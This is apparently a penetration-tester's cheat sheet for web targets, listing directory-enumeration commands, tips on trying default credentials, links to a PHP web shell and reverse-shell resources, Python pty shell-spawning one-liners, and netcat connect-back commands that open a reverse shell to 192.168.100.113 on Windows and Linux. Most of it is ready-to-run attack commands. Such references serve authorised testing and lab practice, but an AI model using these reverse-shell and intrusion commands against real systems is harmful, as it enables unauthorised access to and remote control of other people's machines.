DIRECTORIES ENUMERATION
 
    Gobuster
       • gobuster -e -u http://<target.com>/ -w /usr/share/wordlists/dirb/common.txt
       
    Dirbuster
    
    ffuf
       • ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<target.com>/FFUF
       
    Robots
      • http://<target.com>/robots.txt
    
    
    ////If login page is found, always try with default credentails first, and try to bypass second.



-------------------------------------------------------------------------------------------------------------------------------------



EXPLOITATION WITH HTML/PHP FILES FROM LOCAL MACHINE

  Running exploit HTML/PHP files
       • save exploit HTML/PHP files to /var/www/html
       • start apache2 server
       • run in browser localhost




-------------------------------------------------------------------------------------------------------------------------------------



USEFUL SHELL FOR WEB PAGE EXPLOITATION

  Command line Shells
  
       • https://github.com/flozz/p0wny-shell 
   
   
  Reverse Shells
  
       • http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
       • https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php



 ////If initial shell is occured, always try to spawn full shell (e.g, try python shell spawn, [in Windows] try to download nc.exe to server and connect back)
 
 
 Python Shell Spwan
 
       • python -c 'import pty;pty.spawn("/bin/sh")
       
       • python3 -c 'import pty;pty.spawn("/bin/sh")
    
    
 Netcat Connect Back
 
       • nc.exe 192.168.100.113 4444 –e cmd.exe   ////on Windows machines
       
       • nc 192.168.100.113 4444 –e /bin/bash     ////on Linux machines
       
       
       
 -------------------------------------------------------------------------------------------------------------------------------------
      
       
 
 
